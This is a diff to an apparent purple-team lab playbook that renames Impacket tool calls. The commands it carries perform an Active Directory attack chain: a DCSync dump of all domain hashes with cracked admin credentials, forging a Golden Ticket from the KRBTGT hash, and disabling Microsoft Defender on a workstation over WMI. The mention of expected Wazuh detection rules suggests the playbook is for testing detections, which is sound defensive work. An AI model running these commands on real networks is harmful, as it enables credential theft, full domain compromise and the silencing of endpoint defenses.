@@ -23,7 +23,7 @@ ADMIN_USER=$(jq -r '.cracked[] | select(.method == "lateral" or .method == "kerb
 ADMIN_PASS=$(jq -r '.cracked[] | select(.user == "'"$ADMIN_USER"'") | .password' {{logDir}}/cracked_creds.json | head -1)
 
 # DCSync -- request all domain hashes from DC
-secretsdump.py {{domain}}/"$ADMIN_USER":"$ADMIN_PASS"@{{dc}} \
+impacket-secretsdump {{domain}}/"$ADMIN_USER":"$ADMIN_PASS"@{{dc}} \
   -just-dc 2>&1 | head -50
 ```
 
@@ -36,12 +36,12 @@ If we have the KRBTGT hash from DCSync:
 
 ```bash
 # Create Golden Ticket (offline, no network event)
-ticketer.py -nthash KRBTGT_HASH -domain-sid DOMAIN_SID \
+impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID \
   -domain {{domain}} administrator 2>&1
 
 # Use the ticket
 export KRB5CCNAME=administrator.ccache
-secretsdump.py -k -no-pass {{dc}} 2>&1
+impacket-secretsdump -k -no-pass {{dc}} 2>&1
 ```
 
 Expected Wazuh rule: **100150** (level 14) -- Golden Ticket
@@ -51,7 +51,7 @@ Expected Wazuh rule: **100150** (level 14) -- Golden Ticket
 ```bash
 # ADMIN_USER and ADMIN_PASS extracted above
 # Via RPC/WMI -- disable Defender on a workstation
-wmiexec.py {{domain}}/"$ADMIN_USER":"$ADMIN_PASS"@172.16.20.103 \
+impacket-wmiexec {{domain}}/"$ADMIN_USER":"$ADMIN_PASS"@172.16.20.103 \
   'powershell Set-MpPreference -DisableRealtimeMonitoring $true' 2>&1
 ```
 
